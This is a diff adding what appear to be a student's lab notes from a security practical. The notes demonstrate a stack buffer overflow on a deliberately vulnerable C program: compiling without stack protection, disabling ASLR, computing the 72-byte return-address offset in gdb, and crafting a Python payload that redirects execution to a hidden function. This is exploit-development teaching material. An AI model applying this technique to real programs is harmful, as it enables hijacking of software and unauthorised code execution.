@@ -1,0 +1,68 @@
+└─$ gcc -g -O0 -fno-stack-protector -no-pie -o a_nopie vulnerable.c
+
+
+$ readelf -s a_nopie | grep secret_action || nm -C a_nopie | grep secret_action
+    23: 0000000000401166    22 FUNC    GLOBAL DEFAULT   13 secret_action
+                                                                                                                                                                                              
+┌──(ratjatji㉿kali)-[/media/sf_practical4_cos330]
+└─$ readelf -h a_nopie | egrep 'Type|Machine|Entry point'                       
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Entry point address:               0x401080
+
+└─$ cat /proc/sys/kernel/randomize_va_space
+2
+
+sudo sysctl -w kernel.randomize_va_space=0 0
+
+(gdb) p/x secret_action
+$1 = 0x55
+(gdb) p/x &buf **
+$2 = 0x7fffffffdc10
+(gdb) p/x &small_msg
+$3 = 0x7fffffffdc00
+(gdb) p/x &temp
+$4 = 0x7fffffffdb00
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffdc60:
+ rip = 0x40118e in process_input (vulnerable.c:17); saved rip = 0x40125d
+ called by frame at 0x7fffffffdc80
+ source language c.
+ Arglist at 0x7fffffffdc50, args: label=0x402089 "Stage 1"
+ Locals at 0x7fffffffdc50, Previous frame's sp is 0x7fffffffdc60
+ Saved registers:
+  rbp at 0x7fffffffdc50, rip at 0x7fffffffdc58
+(gdb) info registers rbp rsp
+rbp            0x7fffffffdc50      0x7fffffffdc50
+rsp            0x7fffffffdaf0      0x7fffffffdaf0
+(gdb) x/4gx $rbp-16
+0x7fffffffdc40:	0x0000000000000000	0x00007fffffffdd98
+0x7fffffffdc50**:	0x00007fffffffdc70	0x000000000040125d
+
+//Calculating offset - difference between return address & buffer (how many bytes need to fill before code executes) = return_adress mem loc.(50+8) - address of buffer (10)
+Ox48 must be converted to decimal = 72
+
+(gdb) info address secret_action
+Symbol "secret_action" is a function at address 0x401166.
+
+└─$ python3 - <<'PY' > payload.bin
+import sys
+OFFSET = 72
+SECRET = 0x401166        # <-- replace only if your GDB showed a different address
+sys.stdout.buffer.write(b"A"*OFFSET + SECRET.to_bytes(8, 'little'))
+PY
+
+──(ratjatji㉿kali)-[/media/sf_practical4_cos330]
+└─$ hexdump -C payload.bin | sed -n '1,4p'
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+00000040  41 41 41 41 41 41 41 41  66 11 40 00 00 00 00 00  |AAAAAAAAf.@.....|
+00000050
+
+
+└─$ ./a_nopie < payload.bin
+I hold all the keys!
+Stage 1: enter text> Processed: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf@
+Secret action triggered! (This indicates overflow smashed return address)
+zsh: segmentation fault  ./a_nopie < payload.bin
+
